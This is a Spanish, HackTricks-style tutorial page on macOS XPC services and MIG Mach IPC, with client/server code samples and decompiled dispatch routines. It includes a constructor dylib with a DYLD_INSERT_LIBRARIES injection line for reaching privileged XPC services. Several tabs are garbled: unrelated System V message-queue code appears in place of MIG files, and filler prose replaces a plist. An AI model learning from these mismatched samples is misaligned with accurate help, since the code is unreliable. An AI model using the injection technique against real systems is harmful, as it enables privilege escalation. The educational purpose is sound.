Los principales beneficios de XPC incluyen:

1. **Seguridad**: Al separar el trabajo en diferentes procesos, cada proceso puede recibir solo los permisos que necesita. Esto significa que incluso si un proceso está comprometido, tiene una capacidad limitada para causar daño.
2. **Estabilidad**: XPC ayuda a aislar los bloqueos en el componente donde ocurren. Si un proceso se bloquea, se puede reiniciar sin afectar al resto del sistema.
3. **Rendimiento**: XPC permite una fácil concurrencia, ya que se pueden ejecutar tareas diferentes simultáneamente en diferentes procesos.

La única **desventaja** es que **separar una aplicación en varios procesos** que se comunican a través de XPC es **menos eficiente**. Pero en los sistemas actuales esto casi no se nota y los beneficios son mayores.

### Servicios XPC específicos de la aplicación

Los componentes XPC de una aplicación están **dentro de la propia aplicación**. Por ejemplo, en Safari se pueden encontrar en **`/Applications/Safari.app/Contents/XPCServices`**. Tienen la extensión **`.xpc`** (como **`com.apple.Safari.SandboxBroker.xpc`**) y también son **paquetes** con el binario principal dentro de él: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker` y un `Info.plist: /Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/Info.plist`

Como podrás pensar, un **componente XPC tendrá diferentes derechos y privilegios** que los otros componentes XPC o el binario principal de la aplicación. EXCEPTO si un servicio XPC está configurado con [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) establecido en "True" en su archivo **Info.plist**. En este caso, el servicio XPC se ejecutará en la **misma sesión de seguridad que la aplicación** que lo llamó.

Los servicios XPC se **inician** mediante **launchd** cuando se requieren y se **cierran** una vez que todas las tareas están **completas** para liberar recursos del sistema. **Los componentes XPC específicos de la aplicación solo pueden ser utilizados por la aplicación**, lo que reduce el riesgo asociado con posibles vulnerabilidades.

### Servicios XPC de todo el sistema

Los servicios XPC de todo el sistema son accesibles para todos los usuarios. Estos servicios, ya sean de tipo launchd o Mach, deben estar **definidos en archivos plist** ubicados en directorios especificados como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** o **`/Library/LaunchAgents`**.

Estos archivos plist tendrán una clave llamada **`MachServices`** con el nombre del servicio y una clave llamada **`Program`** con la ruta al binario:
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Los que están en **`LaunchDameons`** son ejecutados por root. Por lo tanto, si un proceso sin privilegios puede comunicarse con uno de ellos, podría ser capaz de escalar privilegios.

### Mensajes de eventos XPC

Las aplicaciones pueden **suscribirse** a diferentes **mensajes de eventos**, lo que les permite ser **iniciadas a pedido** cuando ocurren dichos eventos. La **configuración** de estos servicios se realiza en archivos **plist de launchd**, ubicados en los **mismos directorios que los anteriores** y que contienen una clave adicional **`LaunchEvent`**.

### Verificación del proceso de conexión XPC

Cuando un proceso intenta llamar a un método a través de una conexión XPC, el **servicio XPC debe verificar si ese proceso tiene permitido conectarse**. Aquí se muestran las formas comunes de verificar eso y las trampas comunes:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### Autorización XPC

Apple también permite que las aplicaciones **configuren algunos derechos y cómo obtenerlos**, por lo que si el proceso que llama los tiene, se le permitiría **llamar a un método** del servicio XPC:

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Ejemplo de código en C

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% tab title="xpc_client.c" %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% tab title="xyz.hacktricks.service.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### Ejemplo de código ObjectiveC

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% tab title="oc_xpc_client.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
{% tab title="xyz.hacktricks.svcoc.plist" %}

# xyz.hacktricks.svcoc.plist

Este archivo de propiedad de `xyz.hacktricks.svcoc` es un archivo de preferencias de lanzamiento de macOS que se utiliza para configurar la comunicación entre procesos en el sistema operativo.

## Descripción

En macOS, la comunicación entre procesos se realiza a través de un mecanismo llamado IPC (Inter-Process Communication). Este mecanismo permite que los procesos se comuniquen entre sí y compartan información de manera segura.

El archivo `xyz.hacktricks.svcoc.plist` contiene la configuración de IPC para el proceso `xyz.hacktricks.svcoc`. Define cómo se establece la comunicación entre este proceso y otros procesos en el sistema.

## Ubicación

El archivo `xyz.hacktricks.svcoc.plist` se encuentra en la siguiente ubicación en el sistema de archivos de macOS:

```
/Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
```

## Configuración

El archivo `xyz.hacktricks.svcoc.plist` contiene una serie de claves y valores que definen la configuración de IPC para el proceso `xyz.hacktricks.svcoc`. Estos incluyen:

- `MachServices`: Esta clave define los servicios de Mach que el proceso `xyz.hacktricks.svcoc` puede utilizar para la comunicación con otros procesos. Cada servicio de Mach tiene un nombre único y está asociado con un puerto de comunicación.

- `Sockets`: Esta clave define los sockets de dominio UNIX que el proceso `xyz.hacktricks.svcoc` puede utilizar para la comunicación con otros procesos. Cada socket de dominio UNIX tiene una ruta única en el sistema de archivos.

## Seguridad

Es importante asegurarse de que la configuración de IPC en el archivo `xyz.hacktricks.svcoc.plist` sea segura y no permita la comunicación no autorizada o el acceso no autorizado a otros procesos en el sistema. Esto puede incluir la restricción de los servicios de Mach y los sockets de dominio UNIX que el proceso `xyz.hacktricks.svcoc` puede utilizar, así como la implementación de mecanismos de autenticación y cifrado para garantizar la seguridad de la comunicación entre procesos.

## Referencias

- [Documentación de Apple sobre IPC en macOS](https://developer.apple.com/library/archive/documentation/General/Conceptual/ConcurrencyProgrammingGuide/InterThreadCommunication/InterThreadCommunication.html)

{% endtab %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
### Cliente dentro de un código Dylib

The client code inside a Dylib is responsible for establishing communication with the server and exchanging messages through inter-process communication (IPC). This code is typically written in Objective-C or C and is compiled into a dynamic library (Dylib) that can be loaded by other processes.

To interact with the server, the client code uses IPC mechanisms such as Mach ports or UNIX domain sockets. These mechanisms allow processes to send and receive messages, making it possible for the client to request services from the server and receive responses.

The client code needs to follow a specific protocol defined by the server in order to communicate effectively. This protocol includes the format of the messages, the expected responses, and any authentication or encryption requirements.

By embedding the client code within a Dylib, it can be easily loaded and used by other processes without the need for duplication or reimplementation. This approach promotes code reuse and simplifies the development process.

Overall, the client code inside a Dylib plays a crucial role in facilitating communication between processes and enables the exchange of information and services in a secure and efficient manner.
```
// gcc -dynamiclib -framework Foundation oc_xpc_client.m -o oc_xpc_client.dylib
// gcc injection example:
// DYLD_INSERT_LIBRARIES=oc_xpc_client.dylib /path/to/vuln/bin

#import <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
{
NSString*  _serviceName = @"xyz.hacktricks.svcoc";

NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];

[_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)]];

[_agentConnection resume];

[[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
(void)error;
NSLog(@"Connection Failure");
}] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}    ];
NSLog(@"Done!");

return;
}
```
## MIG - Generador de Interfaz Mach

MIG fue creado para **simplificar el proceso de creación de código de IPC de Mach**. Básicamente, **genera el código necesario** para que el servidor y el cliente se comuniquen con una definición dada. Aunque el código generado sea feo, un desarrollador solo necesitará importarlo y su código será mucho más simple que antes.

### Ejemplo

Crea un archivo de definición, en este caso con una función muy simple:

{% code title="myipc.defs" %}
```cpp
subsystem myipc 500; // Arbitrary name and id

userprefix USERPREF;        // Prefix for created functions in the client
serverprefix SERVERPREF;    // Prefix for created functions in the server

#include <mach/mach_types.defs>
#include <mach/std_types.defs>

simpleroutine Subtract(
server_port :  mach_port_t;
n1          :  uint32_t;
n2          :  uint32_t);
```
{% endcode %}

Ahora utiliza mig para generar el código del servidor y del cliente que podrán comunicarse entre sí para llamar a la función Restar:
```bash
mig -header myipcUser.h -sheader myipcServer.h myipc.defs
```
Se crearán varios archivos nuevos en el directorio actual.

En los archivos **`myipcServer.c`** y **`myipcServer.h`** se puede encontrar la declaración y definición de la estructura **`SERVERPREFmyipc_subsystem`**, que básicamente define la función a llamar en función del ID del mensaje recibido (indicamos un número de inicio de 500):

{% tabs %}
{% tab title="myipcServer.c" %}
```c
/* Description of this subsystem, for use in direct RPC */
const struct SERVERPREFmyipc_subsystem SERVERPREFmyipc_subsystem = {
myipc_server_routine,
500, // start ID
501, // end ID
(mach_msg_size_t)sizeof(union __ReplyUnion__SERVERPREFmyipc_subsystem),
(vm_address_t)0,
{
{ (mig_impl_routine_t) 0,
// Function to call
(mig_stub_routine_t) _XSubtract, 3, 0, (routine_arg_descriptor_t)0, (mach_msg_size_t)sizeof(__Reply__Subtract_t)},
}
};
```
{% tab title="myipcServer.h" %}

```c
#ifndef MYIPCSERVER_H
#define MYIPCSERVER_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define MAX_TEXT_SIZE 512

struct mymsgbuf {
    long mtype;
    char mtext[MAX_TEXT_SIZE];
};

#endif /* MYIPCSERVER_H */
```

{% endtab %}
```c
/* Description of this subsystem, for use in direct RPC */
extern const struct SERVERPREFmyipc_subsystem {
mig_server_routine_t	server;	/* Server routine */
mach_msg_id_t	start;	/* Min routine number */
mach_msg_id_t	end;	/* Max routine number + 1 */
unsigned int	maxsize;	/* Max msg size */
vm_address_t	reserved;	/* Reserved */
struct routine_descriptor	/* Array of routine descriptors */
routine[1];
} SERVERPREFmyipc_subsystem;
```
{% endtab %}
{% endtabs %}

Basándose en la estructura anterior, la función **`myipc_server_routine`** obtendrá el **ID del mensaje** y devolverá la función adecuada para llamar:
```c
mig_external mig_routine_t myipc_server_routine
(mach_msg_header_t *InHeadP)
{
int msgh_id;

msgh_id = InHeadP->msgh_id - 500;

if ((msgh_id > 0) || (msgh_id < 0))
return 0;

return SERVERPREFmyipc_subsystem.routine[msgh_id].stub_routine;
}
```
En este ejemplo solo hemos definido 1 función en las definiciones, pero si hubiéramos definido más, estarían dentro del array de **`SERVERPREFmyipc_subsystem`** y la primera se asignaría al ID **500**, la segunda al ID **501**...

De hecho, es posible identificar esta relación en la estructura **`subsystem_to_name_map_myipc`** de **`myipcServer.h`**:
```c
#ifndef subsystem_to_name_map_myipc
#define subsystem_to_name_map_myipc \
{ "Subtract", 500 }
#endif
```
Finalmente, otra función importante para hacer que el servidor funcione será **`myipc_server`**, que es la que realmente **llamará a la función** relacionada con el id recibido:

<pre class="language-c"><code class="lang-c">mig_external boolean_t myipc_server
(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP)
{
/*
* typedef struct {
* 	mach_msg_header_t Head;
* 	NDR_record_t NDR;
* 	kern_return_t RetCode;
* } mig_reply_error_t;
*/

mig_routine_t routine;

OutHeadP->msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REPLY(InHeadP->msgh_bits), 0);
OutHeadP->msgh_remote_port = InHeadP->msgh_reply_port;
/* Tamaño mínimo: routine() lo actualizará si es diferente */
OutHeadP->msgh_size = (mach_msg_size_t)sizeof(mig_reply_error_t);
OutHeadP->msgh_local_port = MACH_PORT_NULL;
OutHeadP->msgh_id = InHeadP->msgh_id + 100;
OutHeadP->msgh_reserved = 0;

if ((InHeadP->msgh_id > 500) || (InHeadP->msgh_id &#x3C; 500) ||
<strong>	    ((routine = SERVERPREFmyipc_subsystem.routine[InHeadP->msgh_id - 500].stub_routine) == 0)) {
</strong>		((mig_reply_error_t *)OutHeadP)->NDR = NDR_record;
((mig_reply_error_t *)OutHeadP)->RetCode = MIG_BAD_ID;
return FALSE;
}
<strong>	(*routine) (InHeadP, OutHeadP);
</strong>	return TRUE;
}
</code></pre>

Verifica el siguiente código para usar el código generado y crear un servidor y un cliente simples donde el cliente puede llamar a las funciones Restar del servidor:

{% tabs %}
{% tab title="myipc_server.c" %}
```c
// gcc myipc_server.c myipcServer.c -o myipc_server

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include "myipcServer.h"

kern_return_t SERVERPREFSubtract(mach_port_t server_port, uint32_t n1, uint32_t n2)
{
printf("Received: %d - %d = %d\n", n1, n2, n1 - n2);
return KERN_SUCCESS;
}

int main() {

mach_port_t port;
kern_return_t kr;

// Register the mach service
kr = bootstrap_check_in(bootstrap_port, "xyz.hacktricks.mig", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_check_in() failed with code 0x%x\n", kr);
return 1;
}

// myipc_server is the function that handles incoming messages (check previous exlpanation)
mach_msg_server(myipc_server, sizeof(union __RequestUnion__SERVERPREFmyipc_subsystem), port, MACH_MSG_TIMEOUT_NONE);
}
```
{% tab title="myipc_client.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define MAX_TEXT 512

struct my_msg_st {
    long int my_msg_type;
    char some_text[MAX_TEXT];
};

int main() {
    int running = 1;
    struct my_msg_st some_data;
    int msgid;
    char buffer[BUFSIZ];

    // Create a message queue
    msgid = msgget((key_t)1234, 0666 | IPC_CREAT);
    if (msgid == -1) {
        fprintf(stderr, "msgget failed\n");
        exit(EXIT_FAILURE);
    }

    while (running) {
        printf("Enter some text: ");
        fgets(buffer, BUFSIZ, stdin);
        some_data.my_msg_type = 1;
        strcpy(some_data.some_text, buffer);

        // Send the message
        if (msgsnd(msgid, (void *)&some_data, MAX_TEXT, 0) == -1) {
            fprintf(stderr, "msgsnd failed\n");
            exit(EXIT_FAILURE);
        }

        // Exit the loop if the user enters "end"
        if (strncmp(buffer, "end", 3) == 0) {
            running = 0;
        }
    }

    // Delete the message queue
    if (msgctl(msgid, IPC_RMID, 0) == -1) {
        fprintf(stderr, "msgctl(IPC_RMID) failed\n");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}
```

{% endtab %}
```c
// gcc myipc_client.c myipcUser.c -o myipc_client

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include "myipcUser.h"

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "xyz.hacktricks.mig", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("Port right name %d\n", port);
USERPREFSubtract(port, 40, 2);
}
```
## Análisis de Binarios

Dado que muchos binarios ahora utilizan MIG para exponer puertos mach, es interesante saber cómo **identificar que se utilizó MIG** y las **funciones que MIG ejecuta** con cada ID de mensaje.

[**jtool2**](../../macos-apps-inspecting-debugging-and-fuzzing/#jtool2) puede analizar la información de MIG de un binario Mach-O indicando el ID del mensaje e identificando la función a ejecutar:
```bash
jtool2 -d __DATA.__const myipc_server | grep MIG
```
Anteriormente se mencionó que la función que se encargará de **llamar a la función correcta dependiendo del ID del mensaje recibido** es `myipc_server`. Sin embargo, normalmente no tendrás los símbolos del binario (sin nombres de funciones), por lo que es interesante **ver cómo se ve descompilado** ya que siempre será muy similar (el código de esta función es independiente de las funciones expuestas):

{% tabs %}
{% tab title="myipc_server descompilado 1" %}
<pre class="language-c"><code class="lang-c">int _myipc_server(int arg0, int arg1) {
var_10 = arg0;
var_18 = arg1;
// Instrucciones iniciales para encontrar los punteros de función adecuados
*(int32_t *)var_18 = *(int32_t *)var_10 &#x26; 0x1f;
*(int32_t *)(var_18 + 0x8) = *(int32_t *)(var_10 + 0x8);
*(int32_t *)(var_18 + 0x4) = 0x24;
*(int32_t *)(var_18 + 0xc) = 0x0;
*(int32_t *)(var_18 + 0x14) = *(int32_t *)(var_10 + 0x14) + 0x64;
*(int32_t *)(var_18 + 0x10) = 0x0;
if (*(int32_t *)(var_10 + 0x14) &#x3C;= 0x1f4 &#x26;&#x26; *(int32_t *)(var_10 + 0x14) >= 0x1f4) {
rax = *(int32_t *)(var_10 + 0x14);
// Llamada a sign_extend_64 que puede ayudar a identificar esta función
// Esto almacena en rax el puntero a la llamada que debe ser realizada
// Verificar el uso de la dirección 0x100004040 (array de direcciones de funciones)
// 0x1f4 = 500 (el ID de inicio)
<strong>            rax = *(sign_extend_64(rax - 0x1f4) * 0x28 + 0x100004040);
</strong>            var_20 = rax;
// If - else, el if devuelve falso, mientras que el else llama a la función correcta y devuelve verdadero
<strong>            if (rax == 0x0) {
</strong>                    *(var_18 + 0x18) = **_NDR_record;
*(int32_t *)(var_18 + 0x20) = 0xfffffffffffffed1;
var_4 = 0x0;
}
else {
// Dirección calculada que llama a la función adecuada con 2 argumentos
<strong>                    (var_20)(var_10, var_18);
</strong>                    var_4 = 0x1;
}
}
else {
*(var_18 + 0x18) = **_NDR_record;
*(int32_t *)(var_18 + 0x20) = 0xfffffffffffffed1;
var_4 = 0x0;
}
rax = var_4;
return rax;
}
</code></pre>
{% endtab %}

{% tab title="myipc_server descompilado 2" %}
Esta es la misma función descompilada en una versión gratuita diferente de Hopper:

<pre class="language-c"><code class="lang-c">int _myipc_server(int arg0, int arg1) {
r31 = r31 - 0x40;
saved_fp = r29;
stack[-8] = r30;
var_10 = arg0;
var_18 = arg1;
// Instrucciones iniciales para encontrar los punteros de función adecuados
*(int32_t *)var_18 = *(int32_t *)var_10 &#x26; 0x1f | 0x0;
*(int32_t *)(var_18 + 0x8) = *(int32_t *)(var_10 + 0x8);
*(int32_t *)(var_18 + 0x4) = 0x24;
*(int32_t *)(var_18 + 0xc) = 0x0;
*(int32_t *)(var_18 + 0x14) = *(int32_t *)(var_10 + 0x14) + 0x64;
*(int32_t *)(var_18 + 0x10) = 0x0;
r8 = *(int32_t *)(var_10 + 0x14);
r8 = r8 - 0x1f4;
if (r8 > 0x0) {
if (CPU_FLAGS &#x26; G) {
r8 = 0x1;
}
}
if ((r8 &#x26; 0x1) == 0x0) {
r8 = *(int32_t *)(var_10 + 0x14);
r8 = r8 - 0x1f4;
if (r8 &#x3C; 0x0) {
if (CPU_FLAGS &#x26; L) {
r8 = 0x1;
}
}
if ((r8 &#x26; 0x1) == 0x0) {
r8 = *(int32_t *)(var_10 + 0x14);
// 0x1f4 = 500 (el ID de inicio)
<strong>                    r8 = r8 - 0x1f4;
</strong>                    asm { smaddl     x8, w8, w9, x10 };
r8 = *(r8 + 0x8);
var_20 = r8;
r8 = r8 - 0x0;
if (r8 != 0x0) {
if (CPU_FLAGS &#x26; NE) {
r8 = 0x1;
}
}
// Mismo if else que en la versión anterior
// Verificar el uso de la dirección 0x100004040 (array de direcciones de funciones)
<strong>                    if ((r8 &#x26; 0x1) == 0x0) {
</strong><strong>                            *(var_18 + 0x18) = **0x100004000;
</strong>                            *(int32_t *)(var_18 + 0x20) = 0xfffffed1;
var_4 = 0x0;
}
else {
// Llamada a la dirección calculada donde debería estar la función
<strong>                            (var_20)(var_10, var_18);
</strong>                            var_4 = 0x1;
}
}
else {
*(var_18 + 0x18) = **0x100004000;
*(int32_t *)(var_18 + 0x20) = 0xfffffed1;
var_4 = 0x0;
}
}
else {
*(var_18 + 0x18) = **0x100004000;
*(int32_t *)(var_18 + 0x20) = 0xfffffed1;
var_4 = 0x0;
}
r0 = var_4;
return r0;
}

</code></pre>
{% endtab %}
{% endtabs %}

En realidad, si vas a la función **`0x100004000`**, encontrarás el array de estructuras **`routine_descriptor`**, el primer elemento de la estructura es la dirección donde se implementa la función y la **estructura ocupa 0x28 bytes**, por lo que cada 0x28 bytes (a partir del byte 0) puedes obtener 8 bytes y esa será la **dirección de la función** que se llamará:

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Estos datos se pueden extraer [**usando este script de Hopper**](https://github.com/knightsc/hopper/blob/master/scripts/MIG%20Detect.py).
## Referencias

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
